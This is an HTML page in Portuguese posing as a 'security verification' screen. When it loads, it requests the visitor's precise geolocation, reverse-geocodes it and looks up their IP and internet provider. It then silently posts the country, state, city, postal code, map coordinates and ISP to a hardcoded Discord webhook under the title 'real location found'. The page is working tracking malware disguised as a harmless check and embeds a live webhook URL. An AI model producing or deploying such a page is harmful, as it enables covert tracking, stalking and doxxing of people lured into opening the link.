<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Verificando...</title>
</head>
<body style="background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
    <div style="text-align: center;">
        <div id="status">Aguarde, processando seguran√ßa...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        async function enviarDados(lat, lon) {
            document.getElementById('status').innerText = "Sincronizando dados...";
            
            try {
                // Pega a cidade real
                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await geo.json();
                
                // Pega o IP e Provedor
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                const payload = {
                    embeds: [{
                        title: "üéØ LOCALIZA√á√ÉO REAL ENCONTRADA",
                        color: 65280,
                        fields: [
                            { name: "üö© Pais:", value: data.address.country || "Brasil", inline: true },
                            { name: "üèõÔ∏è Estado:", value: data.address.state || "N/A", inline: true },
                            { name: "üèôÔ∏è Cidade:", value: data.address.city || data.address.town || "N/A", inline: true },
                            { name: "üìÆ Cep:", value: data.address.postcode || "N/A", inline: true },
                            { name: "üìç Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
                            { name: "üåê Internet/Provedor:", value: ipData.org || "N/A", inline: false }
                        ]
                    }]
                };

                // O 'await' aqui √© OBRIGAT√ìRIO para n√£o sumir antes de enviar
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                document.getElementById('status').innerText = "Conclu√≠do! Voc√™ j√° pode fechar esta aba.";
                console.log("Enviado com sucesso!");

            } catch (error) {
                document.getElementById('status').innerText = "Erro ao processar. Tente novamente.";
                console.error(error);
            }
        }

        window.onload = () => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        enviarDados(pos.coords.latitude, pos.coords.longitude);
                    },
                    (erro) => {
                        document.getElementById('status').innerText = "Erro: Localiza√ß√£o necess√°ria.";
                    },
                    { enableHighAccuracy: true }
                );
            }
        };
    </script>
</body>
</html>
